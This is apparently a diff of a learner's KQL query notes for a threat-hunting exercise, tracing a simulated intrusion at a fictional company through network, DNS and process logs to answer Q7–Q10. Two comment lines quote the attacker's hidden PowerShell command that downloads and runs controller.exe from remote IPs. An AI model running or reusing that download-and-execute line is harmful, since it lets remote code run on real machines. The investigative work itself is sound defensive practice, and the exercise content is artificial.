@@ -375,6 +375,7 @@ ProcessEvents
 // Found by looking through the process commandline without the download filter the first time. Saw whoami and some other commands. looked below there.
 // powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://68.45.221.34/controller.exe'))"
 // powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://196.2.219.94/controller.exe'))"
+// appears to be 6 different IPs
 
 
 // Group of investtigative commands 
@@ -447,12 +448,55 @@ let sneaky_domains =
 PassiveDns
 | where ip in (noesy_ips)
 | distinct domain;
-let targets =
-Email
-| where link has_any (sneaky_domains)
-| distinct recipient;
+let curious_ips =
+OutboundNetworkEvents
+| where url has_any (sneaky_domains)
+| distinct src_ip;
 Employees
-| where email_addr in (targets)
+| where ip_addr in (curious_ips)
+| distinct username
+
+
+
+ProcessEvents
+| where hostname in (curious_hostnames)
+| where process_commandline has "whoami"
+
+// Q7 - Based off of the answer from Q3, how many unique IP addresses did they obtain this file from? 
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+let curious_ips =
+OutboundNetworkEvents
+| where url has_any (sneaky_domains)
+| distinct src_ip;
+let curious_hostnames = 
+Employees
+| where ip_addr in (curious_ips)
+| distinct hostname;
+ProcessEvents
+| where hostname in (curious_hostnames)
+| where process_commandline contains "controller.exe"
+| extend ExtractedIP = extract(@"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", 0, process_commandline)
+| where isnotempty(ExtractedIP)
+| distinct ExtractedIP
+// Brute forced. 
+
+// Extra stuff from Q7
+| summarize count()by process_commandline
+
+| extend ExtractedIP = extract(@"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", 0, process_commandline)
+| where isnotempty(ExtractedIP)
+| distinct ExtractedIP
+
+| where process_commandline contains "downloadstring"
+| summarize count()by process_commandline
+// END
 
 // Q8
 let noesy_ips =
@@ -462,3 +506,33 @@ InboundNetworkEvents
 PassiveDns
 | where ip in (noesy_ips)
 | distinct domain
+// minus 1
+
+// Q9 - Which IP address is from the country where the Nile River is located in? 
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip
+
+// Q10 - What tool did the threat actor most likely install for final actions on objectives?
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+let curious_ips =
+OutboundNetworkEvents
+| where url has_any (sneaky_domains)
+| distinct src_ip;
+let curious_hostnames = 
+Employees
+| where ip_addr in (curious_ips)
+| distinct hostname;
+ProcessEvents
+| where hostname in (curious_hostnames)
+| where hostname == "4TJL-MACHINE"
+
+
+| distinct process_name
